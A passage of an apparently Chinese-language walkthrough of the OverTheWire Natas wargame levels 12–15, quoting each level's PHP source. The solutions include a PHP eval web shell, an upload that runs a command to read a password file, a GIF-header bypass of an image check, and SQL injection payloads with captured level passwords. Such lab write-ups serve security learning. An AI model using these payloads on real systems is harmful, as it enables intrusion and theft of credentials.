class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;MAX_FILE_SIZE&quot;</span> value=<span class="string">&quot;1000&quot;</span> /&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;filename&quot;</span> value=<span class="string">&quot;&lt;?php print genRandomString(); ?&gt;.jpg&quot;</span> /&gt;</span><br><span class="line">Choose a JPEG to <span class="title function_ invoke__">upload</span> (max <span class="number">1</span>KB):&lt;br/&gt;</span><br><span class="line">&lt;input name=<span class="string">&quot;uploadedfile&quot;</span> type=<span class="string">&quot;file&quot;</span> /&gt;&lt;br /&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Upload File&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/87c3af08403a4389c42db4efbbb140df375.png" alt="image-20230818001718359"></p><ul><li>理解源码</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 判断 post 请求体中是否存在 “filename” 字段，没有则显示文件上传表单</span></span><br><span class="line"><span class="comment"># 2. 有则调用 makeRandomPathFromFilename()、makeRandomPath()、genRandomString() 生成一个类似 “upload/jc2z24a2ys.jpg” 的路径</span></span><br><span class="line"><span class="comment"># 3. 继续检查上传文件（临时存储）的大小是否超过（1KB）</span></span><br><span class="line"><span class="comment"># 4. 没超过则将上传文件移动到 “2.” 生成的路径中</span></span><br><span class="line"><span class="comment"># 5. 移动成功则提示路径，失败则提示重试</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 但为什么 5kb 的图像也是提示重试呢？不该是超出文件大小（File is too big）？</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 请看该句（上文源码 57 行）：&lt;?php print genRandomString(); ?&gt;</span></span><br><span class="line"><span class="comment"># 重命名后的文件名（okydxnm0oa.jpg）在发送请求包时已经确认？准确的说是文件扩展名（jpg）进行了指定，而不是获取上传文件默认的文件后缀（jsp）</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/c8abe68b14087dc4ba6676fde351fe11089.png" alt="image-20230720233257988"></p><ul><li>传个一句话马，修改请求默认的后缀，无法连接成功</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @<span class="built_in">eval</span>($_POST[<span class="string">&#x27;libai&#x27;</span>]);?&gt;</span><br></pre></td></tr></table></figure><ul><li>更改为执行命令</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 请求：http://natas12.natas.labs.overthewire.org/upload/sps4529hy2.php</span></span><br><span class="line"><span class="comment"># 响应：lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9</span></span><br><span class="line">&lt;?php system(<span class="string">&#x27;cat /etc/natas_webpass/natas13&#x27;</span>);?&gt;</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/a71db2a1cfa781110d09827ad67beb44f2f.png" alt="image-20230723233445576"></p><h2 id="Level-13——文件上传-更改文件默认签名"><a href="#Level-13——文件上传-更改文件默认签名" class="headerlink" title="Level 13——文件上传-更改文件默认签名"></a>Level 13——文件上传-更改文件默认签名</h2><ul><li>出于安全考虑，我们现在只接受图像文件！选择要上载的JPEG（最大1KB）：</li></ul><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/8a329a64640213f70667af2077714036932.png" alt="image-20230818001839485"></p><ul><li>源码</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># http://natas13.natas.labs.overthewire.org/index-source.html</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 生成指定长度的随机字符串</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string 生成的随机字符串</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">genRandomString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$length</span> = <span class="number">10</span>;  <span class="comment">// 生成字符串的长度</span></span><br><span class="line">    <span class="variable">$characters</span> = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;</span>;  <span class="comment">// 可选的字符集</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="string">&quot;&quot;</span>;  <span class="comment">// 存储生成的随机字符串</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$p</span> = <span class="number">0</span>; <span class="variable">$p</span> &lt; <span class="variable">$length</span>; <span class="variable">$p</span>++) &#123;</span><br><span class="line">        <span class="variable">$string</span> .= <span class="variable">$characters</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$characters</span>)-<span class="number">1</span>)];  <span class="comment">// 随机选取字符并添加到字符串中</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;  <span class="comment">// 返回生成的随机字符串</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 在指定目录下生成一个随机的文件路径</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $dir 目录路径</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $ext 文件扩展名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string 生成的随机文件路径</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeRandomPath</span>(<span class="params"><span class="variable">$dir</span>, <span class="variable">$ext</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="variable">$path</span> = <span class="variable">$dir</span>.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">genRandomString</span>().<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>;  <span class="comment">// 生成随机路径</span></span><br><span class="line">    &#125; <span class="keyword">while</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$path</span>));  <span class="comment">// 循环检查路径是否已存在，直到找到一个不存在的路径</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$path</span>;  <span class="comment">// 返回生成的随机路径</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据给定的文件名生成一个随机的文件路径</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $dir 目录路径</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $fn 文件名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string 生成的随机文件路径</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeRandomPathFromFilename</span>(<span class="params"><span class="variable">$dir</span>, <span class="variable">$fn</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$fn</span>, PATHINFO_EXTENSION);  <span class="comment">// 从文件名中获取扩展名</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">makeRandomPath</span>(<span class="variable">$dir</span>, <span class="variable">$ext</span>);  <span class="comment">// 使用扩展名生成随机路径</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;filename&quot;</span>, <span class="variable">$_POST</span>)) &#123;</span><br><span class="line">    <span class="variable">$target_path</span> = <span class="title function_ invoke__">makeRandomPathFromFilename</span>(<span class="string">&quot;upload&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&quot;filename&quot;</span>]);  <span class="comment">// 生成随机路径并添加到目标路径</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$err</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploadedfile&#x27;</span>][<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$err</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$err</span> === <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;The uploaded file exceeds MAX_FILE_SIZE&quot;</span>;  <span class="comment">// 如果文件大小超过限制，则显示错误信息</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Something went wrong :/&quot;</span>;  <span class="comment">// 如果发生其他错误，则显示错误信息</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">filesize</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploadedfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]) &gt; <span class="number">1000</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File is too big&quot;</span>;  <span class="comment">// 如果文件大小超过1KB，则显示错误信息</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploadedfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File is not an image&quot;</span>;  <span class="comment">// 如果上传的文件不是图像，则显示错误信息</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploadedfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$target_path</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;The file &lt;a href=\&quot;<span class="subst">$target_path</span>\&quot;&gt;<span class="subst">$target_path</span>&lt;/a&gt; has been uploaded&quot;</span>;  <span class="comment">// 移动上传的文件到目标路径，并显示成功信息</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;There was an error uploading the file, please try again!&quot;</span>;  <span class="comment">// 如果移动文件失败，则显示错误信息</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    &lt;form enctype=<span class="string">&quot;multipart/form-data&quot;</span> action=<span class="string">&quot;index.php&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;MAX_FILE_SIZE&quot;</span> value=<span class="string">&quot;1000&quot;</span> /&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;filename&quot;</span> value=<span class="string">&quot;&lt;?php print genRandomString(); ?&gt;.jpg&quot;</span> /&gt;</span><br><span class="line">        Choose a JPEG to <span class="title function_ invoke__">upload</span> (max <span class="number">1</span>KB):&lt;br/&gt;</span><br><span class="line">        &lt;input name=<span class="string">&quot;uploadedfile&quot;</span> type=<span class="string">&quot;file&quot;</span> /&gt;&lt;br /&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Upload File&quot;</span> /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/2675e380cd0543e4c3bd4bd30d991277e31.png" alt="image-20230818001922785"></p><ul><li>不理解源码，直接测试</li><li>根据提示：出于安全考虑，我们现在只接受图像文件</li><li>提示2：选择要上载的JPEG（最大1KB）</li><li>在网页源代码中又发现了：<code>&lt;input type=&quot;hidden&quot; name=&quot;filename&quot; value=&quot;uoomam3zpv.jpg&quot; /&gt;</code>，不会又是默认后缀吧？</li><li>测试上传<ul><li>大图像文件，提示：上载的文件超过MAX_file_SIZE</li><li>txt 文件：文件不是图像</li><li>txt 改为 jpg 文件：文件不是图像。——怀疑是检查文件头，</li><li>添加 jpg 头（瞎搞的）：文件不是图像。</li><li>添加 gif 头（GIF89a）：ok</li></ul></li><li>源码查看及重要函数说明：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># exif_imagetype()</span></span><br><span class="line"><span class="comment"># 在 PHP 中用于检测文件的真实图像类型</span></span><br><span class="line"><span class="comment"># 读取图像文件的第一个字节或字节序列，检查其对应的签名来判断文件的实际类型</span></span><br><span class="line">png图片的文件头标识？</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># GIF89a  qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/b26bbfafa937cb94ca1cf5dd13388766ece.png" alt="image-20230725000356897"></p><h2 id="Level-14——sql注入-双引号报错-登录框"><a href="#Level-14——sql注入-双引号报错-登录框" class="headerlink" title="Level 14——sql注入-双引号报错-登录框"></a>Level 14——sql注入-双引号报错-登录框</h2><ul><li>登录框</li></ul><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/42582affb3ea6ca350a46427a6699f1485b.png" alt="image-20230818002047874"></p><ul><li>源码</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># http://natas14.natas.labs.overthewire.org/index-source.html</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 检查是否存在 &quot;username&quot; 键名的请求参数</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;username&quot;</span>, <span class="variable">$_REQUEST</span>)) &#123;</span><br><span class="line">    <span class="comment">// 建立与数据库的连接</span></span><br><span class="line">    <span class="variable">$link</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;natas14&#x27;</span>, <span class="string">&#x27;&lt;censored&gt;&#x27;</span>);</span><br><span class="line">    <span class="comment">// 选择数据库</span></span><br><span class="line">    <span class="title function_ invoke__">mysqli_select_db</span>(<span class="variable">$link</span>, <span class="string">&#x27;natas14&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构建查询语句，使用请求参数中的 &quot;username&quot; 和 &quot;password&quot; 进行匹配查询</span></span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;SELECT * from users where username=\&quot;&quot;</span> . <span class="variable">$_REQUEST</span>[<span class="string">&quot;username&quot;</span>] . <span class="string">&quot;\&quot; and password=\&quot;&quot;</span> . <span class="variable">$_REQUEST</span>[<span class="string">&quot;password&quot;</span>] . <span class="string">&quot;\&quot;&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 检查是否存在 &quot;debug&quot; 键名的 GET 参数，如果存在则显示查询语句</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;debug&quot;</span>, <span class="variable">$_GET</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Executing query: <span class="subst">$query</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行查询，并检查返回结果集中的行数</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>, <span class="variable">$query</span>)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 如果有匹配结果行，输出登录成功信息，并给出 natas15 的密码</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Successful login! The password for natas15 is &lt;censored&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 如果没有匹配结果行，输出访问被拒绝信息</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Access denied!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 关闭与数据库的连接</span></span><br><span class="line">    <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$link</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 如果请求中不存在 &quot;username&quot; 键名的参数，则显示登录表单</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;index.php&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">    Username: &lt;input name=<span class="string">&quot;username&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">    Password: &lt;input name=<span class="string">&quot;password&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Login&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/a85db573a9c7816873e83e9aeb74388337b.png" alt="image-20230818002023093"></p><ul><li><p>登录框</p><ul><li><p>输入 admin:admin——访问被拒绝！</p></li><li><p>测了个单引号，就看源码了——不可取，多试几个方法嘛，双引号、括号、多个括号……</p></li><li><p>get 请求中添加 debug 参数可以看到返回包中看到执行的 SQL 语句：<a class="link" target="_blank" rel="noopener" href="http://natas14.natas.labs.overthewire.org/index.php?debug=1%EF%BC%8C%E7%BB%93%E6%9E%9C%E7%B1%BB%E4%BC%BC%EF%BC%9A%60Executing">http://natas14.natas.labs.overthewire.org/index.php?debug=1，结果类似：`Executing<i class="fas fa-external-link-alt"></i></a> query: SELECT * from users where username&#x3D;”admin” and password&#x3D;”123456”&#96;</p></li><li><p>请叫我菜鸡，看源码都看不懂……一个恒等式就可以了：<code>password=123456&amp;username=admin&quot;or 1=1 --+</code></p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Executing query: SELECT * <span class="keyword">from</span> users where username=<span class="string">&quot;admin&quot;</span><span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span> -- <span class="string">&quot; and password=&quot;</span><span class="number">123456</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">Successful login! The password for natas15 is TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/20342bcc9b15eb7490dfdc7cb3378475958.png" alt="image-20230801223227027"></p></li></ul><h2 id="Level-15——sql注入-双引号报错-查询框-布尔注入"><a href="#Level-15——sql注入-双引号报错-查询框-布尔注入" class="headerlink" title="Level 15——sql注入-双引号报错-查询框-布尔注入"></a>Level 15——sql注入-双引号报错-查询框-布尔注入</h2><ul><li>搜索框</li></ul><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/21b68823165883298165cf19f9e7f010628.png" alt="image-20230818002146340"></p><ul><li>源码</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># http://natas15.natas.labs.overthewire.org/index-source.html</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">CREATE TABLE `users` (</span></span><br><span class="line"><span class="comment">  `username` varchar(64) DEFAULT NULL,</span></span><br><span class="line"><span class="comment">  `password` varchar(64) DEFAULT NULL</span></span><br><span class="line"><span class="comment">);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查是否存在 &quot;username&quot; 键名的请求参数</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;username&quot;</span>, <span class="variable">$_REQUEST</span>)) &#123;</span><br><span class="line">    <span class="comment">// 建立与数据库的连接</span></span><br><span class="line">    <span class="variable">$link</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;natas15&#x27;</span>, <span class="string">&#x27;&lt;censored&gt;&#x27;</span>);</span><br><span class="line">    <span class="comment">// 选择数据库</span></span><br><span class="line">    <span class="title function_ invoke__">mysqli_select_db</span>(<span class="variable">$link</span>, <span class="string">&#x27;natas15&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构建查询语句，使用请求参数中的 &quot;username&quot; 进行匹配查询</span></span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;SELECT * from users where username=\&quot;&quot;</span> . <span class="variable">$_REQUEST</span>[<span class="string">&quot;username&quot;</span>] . <span class="string">&quot;\&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查是否存在 &quot;debug&quot; 键名的 GET 参数，如果存在则显示查询语句</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;debug&quot;</span>, <span class="variable">$_GET</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Executing query: <span class="subst">$query</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行查询</span></span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$res</span>) &#123;</span><br><span class="line">        <span class="comment">// 检查返回结果集中是否有匹配的行数</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$res</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;This user exists.&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;This user doesn&#x27;t exist.&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 查询出错</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Error in query.&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭与数据库的连接</span></span><br><span class="line">    <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$link</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;index.php&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">    Username: &lt;input name=<span class="string">&quot;username&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Check existence&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.statically.io/gh/0xtlu/blogsPicture/main/2023/09/14/ca4061cf6f389f6033996a3c5bc4f274596.png" alt="image-20230818002204533"></p><ul><li>查询框<ul><li><code>username=admin</code>——此用户不存在。</li><li><code>username=admin&#39;</code>——此用户不存在。</li><li><code>username=admin&quot;</code>——查询中出错。</li><li><code>username=admin&quot;or 1=1--+</code>——此用户已存在。</li><li><del>报错注入？联合查询？</del>盲注？</li><li>看参考，嗯，是拼接新字段，又学到了</li></ul></li><li>大佬脚本<ul><li>利用 <code>LIKE BINARY</code> 关键字对密码进行二进制级别的比较，即考虑大小写。——靶场验证登录密码大小写呀。</li><li>由于 <code>%char%</code> 的存在，将判断密码中使用到的每个字符 <code>char</code> 并存在字符拼接到 <code>filtered</code>。</li><li>根据 <code>filtered</code> 字符串，两层循环跑 32 位真实密码，<code>passwd</code> 